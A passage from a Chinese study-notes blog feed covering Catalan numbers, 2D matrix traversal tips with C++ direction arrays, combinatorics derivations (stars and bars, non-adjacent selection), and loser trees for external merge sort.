mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><br>适合用大整数或高精度库。</p></li><li><p>线性递推（从前一项滚动推后一项）<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>C</mi><mi>n</mi></msub><mo>⋅</mo><mfrac><mrow><mn>4</mn><mi>n</mi><mo>+</mo><mn>2</mn></mrow><mrow><mi>n</mi><mo>+</mo><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">C_{n+1}=C_n\cdot \frac{4n+2}{n+2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2484em;vertical-align:-0.4033em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4033em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br>每步一次乘除，注意整除无误差；实现时最好用大整数或先约分。</p></li></ol><p>小表（前几项）<br>n: 1,2,3,4,5,6,7,8,9,10<br>Cₙ: 1,2,5,14,42,132,429,1430,4862,16796</p><p>整型范围提示<br>•int 最多到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.1</mn><mo>×</mo><msup><mn>10</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">2.1\times10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2.1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>；C₁₉=1,767,263,190 还勉强能放，C₂₀=6,564,120,420 就溢出了。<br>•long long 可安全到 n=35（C₃₅≈3.116×10¹⁸ &lt; 2⁶³−1）。更大就要高精度。</p><hr><h2 id="二维矩阵">二维矩阵</h2><p>二维矩阵题给人的压迫感，往往不在代码量，而在于：<br>•坐标系的混乱：到底是 <code>a[x][y]</code> 还是<code> a[y][x]</code>？从 1 开始还是从 0 开始？<br>•遍历方向的多样：上下左右、斜对角、跳马步，容易漏掉或写错。<br>•边界条件的麻烦：是不是越界？是不是访问过？是不是要回溯？<br>•可视化困难：在脑子里想“点和点的关系”比一维复杂很多。</p><p>看到矩阵题会害怕，其实是大脑在提醒你“这类题细节多、容易掉坑”。</p><hr><p>怎么化解这种“二维恐惧症”？</p><h3 id="技巧">技巧</h3><p>一些很实用的小技巧：</p><ol><li>固定模板<br>先写好一个方向数组，比如走 8 个方向：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dx<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dy<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者像马跳的 8 个方向：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> dx<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> dy<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以后只要 <code>for(int d=0;d&lt;8;d++)&#123; nx=x+dx[d]; ny=y+dy[d]; &#125;</code>，再加边界判断。这样就不会一边想题一边还要写乱七八糟的 if/else。</p><ol start="2"><li>边界判断写成函数</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">inside</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> x<span class="token operator">>=</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x<span class="token operator">&lt;=</span>n <span class="token operator">&amp;&amp;</span> y<span class="token operator">>=</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> y<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样比直接写条件判断要清晰、少 bug。</p><ol start="3"><li><p>先手动画一张小图<br>比如 3×3、4×4，用笔画出来，标记 BFS 的扩展顺序，你会发现很多规律更直观。</p></li><li><p>小数据先跑暴力<br>先写 BFS/DFS 版本，在 n=5,k=2 这种小范围跑出来，打印过程，心里就踏实多了。</p></li></ol><hr><h3 id="心态">心态</h3><p>二维矩阵题 不是 DP 的专利，它可以是 BFS（可达性）、DFS（连通块）、模拟（翻格子）、数学（对称性）。你害怕其实是因为没把“矩阵”当作普通的图。把矩阵想成一个图，格子是节点，四周/八周/马步是边，其实问题就清爽了。</p><hr>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="算法积累" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%A7%AF%E7%B4%AF/"/>
    
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="编程" scheme="https://notes.moyuin.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>离散数学 - 组合数学</title>
    <link href="https://notes.moyuin.top/2025/06/05/xue-xi/shu-xue/chi-san-shu-xue-zu-he-shu-xue/"/>
    <id>https://notes.moyuin.top/2025/06/05/xue-xi/shu-xue/chi-san-shu-xue-zu-he-shu-xue/</id>
    <published>2025-06-05T01:02:07.000Z</published>
    <updated>2025-06-05T01:02:07.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>离散数学 - 组合数学</h1><p>只是 copy，没有力气整理了。</p><h2 id="公式">公式</h2><p>这两个公式在组合数学中非常有用，分别解决不同类型的问题。我们来逐个解释一下它们的来源和思路：</p><h3 id="1-公式-C-n−k-1-k-“选-k-个不相邻元素”">1. 公式 C(n−k+1,k): “选 k 个不相邻元素”</h3><p>问题场景：<br>从排成一排的 n 个不同元素中，选出 k 个元素，要求这 k 个元素中任意两个都不能相邻。问有多少种选法？<br><strong>推导思路 (转换法/映射法):</strong></p><ol><li><strong>标记元素位置：</strong> 假设这 n 个元素的位置编号为 1,2,…,n。我们要选出 k 个位置 x1​,x2​,…,xk​，并且它们满足 1≤x1​&lt;x2​&lt;…&lt;xk​≤n。</li><li><strong>不相邻条件：</strong> “任意两个不相邻”意味着：<ul><li>x2​−x1​≥2</li><li>x3​−x2​≥2</li><li>…</li><li>xk​−xk−1​≥2</li></ul></li><li><strong>变量代换 (核心技巧)：</strong> 为了消除“≥2”这个不方便处理的条件，我们引入一组新的变量 y1​,y2​,…,yk​：<ul><li>y1​=x1​</li><li>y2​=x2​−1</li><li>y3​=x3​−2</li><li>…</li><li>yk​=xk​−(k−1)</li></ul></li><li><strong>分析新变量的性质：</strong><ul><li>由于 x1​≥1，所以 y1​≥1。</li><li>y2​−y1​=(x2​−1)−x1​=(x2​−x1​)−1。因为 x2​−x1​≥2，所以 (x2​−x1​)−1≥1。这意味着 y2​&gt;y1​。</li><li>同理，y3​−y2​=(x3​−2)−(x2​−1)=(x3​−x2​)−1≥1。这意味着 y3​&gt;y2​。</li><li>依此类推，我们得到 1≤y1​&lt;y2​&lt;…&lt;yk​。</li><li>现在看 yk​ 的上限：yk​=xk​−(k−1)。因为 xk​≤n，所以 yk​≤n−(k−1)=n−k+1。</li></ul></li><li>问题转化：<br>我们成功地将“从 1,…,n 中选 k 个不相邻的数 xi​”的问题，转化为了“从 1,…,n−k+1 中选 k 个不同的数 yi​”的问题。<br>从 n−k+1 个数中选 k 个不同的数，选法数量就是组合数 C(n−k+1,k)。</li></ol><p><strong>另一种直观理解 (插空法变种 / 隔板法思想)：</strong></p><ol><li>想象我们有 k 个要选中的物品（“选中球”）和 n−k 个不选中的物品（“白色球”）。</li><li>为了保证选中的 k 个物品不相邻，我们可以先把这 k 个“选中球”拿出来。</li><li>剩下 n−k 个“白色球”。将它们排成一排，它们之间以及两端会形成 (n−k)+1 个空隙。 _ W _ W _ … _ W _ (W代表白色球，_ 代表空隙)</li><li>现在，将 k 个“选中球”放入这 (n−k)+1 个空隙中，每个空隙最多放一个球。这样就能保证任意两个“选中球”之间至少隔着一个“白色球”，即它们不相邻。</li><li>从 (n−k)+1 个空隙中选择 k 个空隙来放置“选中球”，选法数量就是 C(n−k+1,k)。</li></ol><hr><h3 id="2-公式-C-n-k−1-k−1-或-C-n-k−1-n-“隔板法”-“不定方程非负整数解”">2. 公式 C(n+k−1,k−1) 或 C(n+k−1,n): “隔板法” / “不定方程非负整数解”</h3><p>问题场景1 (不定方程解)：</p><p>方程 x1​+x2​+…+xk​=n 有多少组非负整数解 (即 xi​≥0)？</p><p>问题场景2 (相同物品分给不同人)：</p><p>将 n 个相同的物品分给 k 个不同的人，每人可以分到0个或多个，有多少种分法？</p><p>这两个场景是等价的。xi​ 可以看作第 i 个人分到的物品数量。</p><p><strong>推导思路 (“隔板法” / “Stars and Bars”):</strong></p><ol><li><p>物品表示 (Stars)： 把 n 个相同的物品想象成 n 个小星星（*）排成一列：</p><ul><li><ul><li><ul><li>… * (共 n 个星)</li></ul></li></ul></li></ul></li><li><p><strong>分组 (Bars)：</strong> 要将这 n 个星星分成 k 组 (对应 k 个人或 k 个变量 xi​)，我们只需要在这 n 个星星形成的序列中插入 k−1 个隔板（<code>|</code>）。</p><ul><li>例如，如果 n=5,k=3 (即 x1​+x2​+x3​=5)：<ul><li><code>**|*|**</code> 表示 x1​=2,x2​=1,x3​=2</li><li><code>***||**</code> 表示 x1​=3,x2​=0,x3​=2</li><li><code>||*****</code> 表示 x1​=0,x2​=0,x3​=5</li></ul></li></ul></li><li><p>排列隔板和星星： 我们现在总共有 n 个星星和 k−1 个隔板。这些星星和隔板共同占据了 n+(k−1) 个位置。</p><p>我们的问题就转化成了：在这 n+k−1 个位置中，选择 k−1 个位置放置隔板（剩下的位置自然就是星星了）。</p><p>选择的方法数就是组合数 C(n+k−1,k−1)。</p></li><li><p>等价形式：</p><p>同样，我们也可以选择 n 个位置放置星星（剩下的位置就是隔板）。</p><p>选择的方法数是 C(n+k−1,n)。</p><p>根据组合数的性质 C(N,K)=C(N,N−K)，我们知道 C(n+k−1,k−1)=C(n+k−1,(n+k−1)−(k−1))=C(n+k−1,n)。所以这两个表达式是等价的。</p></li></ol><p><strong>场景变形：如果要求每人至少分到1个物品 (即 xi​≥1)</strong></p><ol><li><p><strong>预先分配：</strong> 先给每人（每个变量）分配1个物品。这样就用掉了 k 个物品。</p></li><li><p><strong>剩余分配：</strong> 还剩下 n−k 个物品。现在的问题变成将这 n−k 个物品分给 k 个人，每人可以分到0个或多个。</p></li><li><p>套用公式： 把问题中的 n 替换为 n−k，套用上面的隔板法公式：</p><p>C((n−k)+k−1,k−1)=C(n−1,k−1)。</p><ul><li>或者直观理解：有 n 个星星 <code>* * ... *</code>。它们之间有 n−1 个空隙。要将它们分成 k 份（且每份至少1个），只需要在这 n−1 个空隙中选择 k−1 个位置插入隔板。方法数是 C(n−1,k−1)。</li><li>你之前第一个问题“4位同学分吃10个相同的苹果，每位同学至少会吃1个”，就是这个变形。n=10,k=4，所以是 C(10−1,4−1)=C(9,3)=84。</li></ul></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="日常学习" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="离散数学" scheme="https://notes.moyuin.top/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="数学" scheme="https://notes.moyuin.top/tags/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="离散数学" scheme="https://notes.moyuin.top/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>败者树</title>
    <link href="https://notes.moyuin.top/2025/06/01/xue-xi/shu-ju-jie-gou/bai-zhe-shu/"/>
    <id>https://notes.moyuin.top/2025/06/01/xue-xi/shu-ju-jie-gou/bai-zhe-shu/</id>
    <published>2025-06-01T12:06:46.000Z</published>
    <updated>2025-06-01T12:06:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>多路归并外排序: 败者树</h1><h2 id="外排序基本思想">外排序基本思想</h2><p><strong>外排序</strong>是指数据量太大，无法一次性全部装入内存时，借助外存（磁盘）进行排序。<br>常用方法是<strong>多路归并排序</strong>，即先将数据分成若干“归并段”，每次归并时只将部分数据读入内存。<br>一般来说它的优点有这三种：</p><ul><li><p>处理大规模数据集：当数据集太大，无法在计算机的内存中完全装入时，外部排序算法是一个很好的选择。例如，在<strong>处理大型数据库或超大规模文件</strong>时，通常需要使用外部排序算法。</p></li><li><p>节约内存：当内存受限时，外部排序算法也是很有用的。例如，在移动设备等资源受限的计算机上运行排序操作时，使用外部排序算法可以避免占用过多的内存。</p></li><li><p>并行处理：外部排序算法还可以通过将数据集分成多个块并对每个块进行并行处理来进一步提高性能。这意味着可以使用多个处理器或计算机来同时处理数据集，从而加快排序速度。</p></li></ul><p><strong>败者树就是为了并行处理，而构造的一种树。</strong></p><hr><h2 id="多路归并排序">多路归并排序</h2><p>想象一下，家里突然来了一大堆快递包裹，每个包裹里装着不同年代的明信片。<br>我想把所有明信片按时间顺序排列，但家里的桌子太小，没办法一次性摊开全部包裹。怎么办？<br>只能<strong>分批处理</strong>——这就是“外排序”的现实版，没法直接一次性处理好这些数据。</p><p><strong>多路归并排序</strong>的套路就像开 k 个快递包裹，每次从每个包裹里抽一张<strong>最特殊的明信片</strong>（最年代久远的，或者是最年轻的），摆成一排，不断重复，直到所有包裹都拆完。最后我们就得到了一个基于特殊程度顺序的，明信片排列。我们把所有的拆开，一步一步组合，最后得到归并顺序，这就是<strong>k路归并</strong>。<br><img src="https://pic.moyuin.top/2025/06/01/683c1f85dc62e.png" alt=""></p><p>一开始我们只有使用堆来完成多路归并，但是人们发现堆每次取出最小值之后，把最后一个数放到堆顶，调整堆的时候，<strong>每次都要选出父节点的两个孩子节点的最小值</strong>，<strong>然后再用孩子节点的最小值和父节点进行比较，所以每调整一层需要比较两次</strong>。</p><p>这时人们想能否简化比较过程，这时就有了<strong>胜者树</strong>：<br><img src="https://pic.moyuin.top/2025/06/01/683c1c9c998fd.png" alt=""><br>这样<strong>每次比较只用跟自己的兄弟节点进行比较</strong>就好，所以用胜者树可以比堆少一半的比较次数。</p><p>而胜者树在节点上升的时候，需要获得父节点，然后再获得兄弟节点，然后再比较，判断要不要上升。<br>这时人们又想能否再次减少读取节点的次数，于是就有了<strong>败者树</strong>。<br><img src="https://pic.moyuin.top/2025/06/01/683c1de998f2e.png" alt=""></p><p>在使用败者树的时候，每个新元素上升时，只需要获得父节点并比较即可。</p><p>那么胜者树，败者树到底有什么区别呢？</p><blockquote><p>败者树是胜者树的一种变体，它也是一棵完全二叉树。和胜者树不同的是，败者树的节点存储的是败者。<br>一般采用数组模拟胜者树或败者树的结构，所以胜者树、败者树选哪一个都行，胜者树相比败者树要少维护一个冠军项。<br>败者树便于查找、更新和归并输出胜者。</p></blockquote><hr><h2 id="败者树结构与实现">败者树结构与实现</h2><h3 id="败者树的结构图">败者树的结构图</h3><p>基础图形，特殊于树顶有一个唯一值胜者：</p><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TDW<span class="token text string">["🥇胜者的索引 i"]</span>    A<span class="token text string">["🥈败者第1名的索引 i"]</span>    B1<span class="token text string">["败者索引 i"]</span>    B2<span class="token text string">["败者索引 i"]</span>    C1<span class="token text string">["选手1"]</span>    C2<span class="token text string">["选手2"]</span>    C3<span class="token text string">["选手3"]</span>    C4<span class="token text string">["选手4"]</span>    W <span class="token arrow operator">--></span> A    A <span class="token arrow operator">--></span> B1    A <span class="token arrow operator">--></span> B2    B1 <span class="token arrow operator">--></span> C1    B1 <span class="token arrow operator">--></span> C2    B2 <span class="token arrow operator">--></span> C3    B2 <span class="token arrow operator">--></span> C4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基础分析（定最小者赢）：<br><img src="https://pic.moyuin.top/2025/06/01/683c207f36868.png" alt=""></p><h3 id="建树与维护过程">建树与维护过程</h3><h4 id="建立败者树">建立败者树</h4><p>让我们建立一个败者树，<code>ls[0]</code>,<code>ls[1]</code>, <code> ls[2]</code>, <code> ls[3]</code>, <code>ls[4]</code> 是败者树的内部节点（即非叶子节点），存储每一轮败者的索引，b0~b4是败者树的叶子节点。<br>败者树的每个节点存储的都是两两比较的败者（数大者败，我们先要求出的是各归并路中的最小嘛）在原数组中的索引。</p><ol><li><p><code>b3</code> 和 <code>b4</code> 比较，<code>b3</code> &lt; <code>b4</code>, <code>b4</code> 败。所以父节点 <code>ls[4]=4</code>. 胜者是 <code>b3</code>, 所以 3 就晋级下一轮与 <code>b0</code> 比较（图中树的边上的数字就是晋级的选手编号）</p></li><li><p><code>b0</code> 与 <code>b3</code> 比较, <code> b3</code> &lt; <code>b0</code>, <code>b0</code> 败, 所以父节点 <code>ls[2]=0</code>, 胜者是 <code>b3</code>，所以 3 就晋级下一轮与另一边晋级的比较</p></li><li><p><code>b1</code> 与 <code>b2</code> 比较, <code>b1</code> &lt; <code>b2</code>, <code>b2</code> 败, 所以父节点 <code>ls[3]=2</code>. 胜者是 <code>b1</code>, 所以1就晋级下一轮与b3会师总决赛。</p></li><li><p><code>b1</code> 与 <code>b3</code> 比较, <code>b3</code> &lt; <code>b1</code>, <code>b1</code> 败, 所以父节点 <code>ls[1]=1</code>. 胜者是 <code>b3</code>, 所以 <code>ls[0]</code> 记录最终胜者3。排序最小值，算法输出 <code> b[3]</code>（原数组中最小）。<br>最后构造成功：</p></li></ol><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid"><span class="token keyword">graph</span> TD    <span class="token keyword">subgraph</span> <span class="token string">"最终败者树结构与节点值"</span>        LS0_final<span class="token text string">["ls[0]=3 (总胜者索引)"]</span>        LS1_final<span class="token text string">["ls[1]=1 (败者索引)"]</span>        LS2_final<span class="token text string">["ls[2]=0 (败者索引)"]</span>        LS3_final<span class="token text string">["ls[3]=2 (败者索引)"]</span>        LS4_final<span class="token text string">["ls[4]=4 (败者索引)"]</span>        B0_f<span class="token text string">["b0 (10)"]</span>        B1_f<span class="token text string">["b1 (5)"]</span>        B2_f<span class="token text string">["b2 (8)"]</span>        B3_f<span class="token text string">["b3 (2)"]</span>        B4_f<span class="token text string">["b4 (12)"]</span>        LS0_final <span class="token arrow operator">--></span> LS1_final        LS1_final <span class="token arrow operator">--></span> LS2_final        LS1_final <span class="token arrow operator">--></span> LS3_final        LS2_final <span class="token arrow operator">--></span> B0_f        LS2_final <span class="token arrow operator">--></span> LS4_final        LS4_final <span class="token arrow operator">--></span> B3_f        LS4_final <span class="token arrow operator">--></span> B4_f        LS3_final <span class="token arrow operator">--></span> B1_f        LS3_final <span class="token arrow operator">--></span> B2_f        <span class="token keyword">style</span> LS0_final <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#90EE90<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#006400<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>2px</span>        <span class="token keyword">style</span> LS1_final <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span>        <span class="token keyword">style</span> LS2_final <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span>        <span class="token keyword">style</span> LS3_final <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span>        <span class="token keyword">style</span> LS4_final <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#D3D3D3<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span>        <span class="token keyword">style</span> B3_f <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#ADFF2F<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#333</span> <span class="token comment">%% Highlight the winner leaf</span>    <span class="token keyword">end</span>    <span class="token comment">%% Styling</span>    <span class="token keyword">classDef</span> playerNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#FFFACD<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#B8860B<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>1px</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> B0,B1,B2,B3,B4 playerNode<span class="token punctuation">;</span>    <span class="token keyword">class</span> B0_f,B1_f,B2_f,B3_f,B4_f playerNode<span class="token punctuation">;</span>    <span class="token keyword">classDef</span> stepNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#ADD8E6<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#4682B4<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>1px<span class="token punctuation">,</span><span class="token property">border-radius</span><span class="token operator">:</span>5px</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> Step1,Step2,Step3,Step4,Step5 stepNode<span class="token punctuation">;</span>    <span class="token keyword">classDef</span> winnerNode <span class="token style"><span class="token property">fill</span><span class="token operator">:</span>#FFA07A<span class="token punctuation">,</span><span class="token property">stroke</span><span class="token operator">:</span>#CD5C5C<span class="token punctuation">,</span><span class="token property">stroke-width</span><span class="token operator">:</span>1px<span class="token punctuation">,</span><span class="token property">shape</span><span class="token operator">:</span>capsule</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> Step1_W,Step2_W,Step3_W,Step4_W winnerNode<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="维护败者树">维护败者树</h4><p>我们一般用&quot;<strong>更新</strong>&quot;来说明败者树的维护：</p><p>我们来了一个新的成员，走了一个成员，想要让它加入后重塑这颗树，实现<strong>败者树的更新</strong>。<br>可以想象成<strong>晋级赛</strong>：上一轮的冠军带着“新人”重新参加比赛，只需要重新打一遍自己走过的那条“晋级之路”，而其它归并段（叶子）完全不用重新比较。每次归并输出和更新，最多只需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>k</mi></mrow><annotation encoding="application/x-tex">\log_2 k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9386em;vertical-align:-0.2441em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord 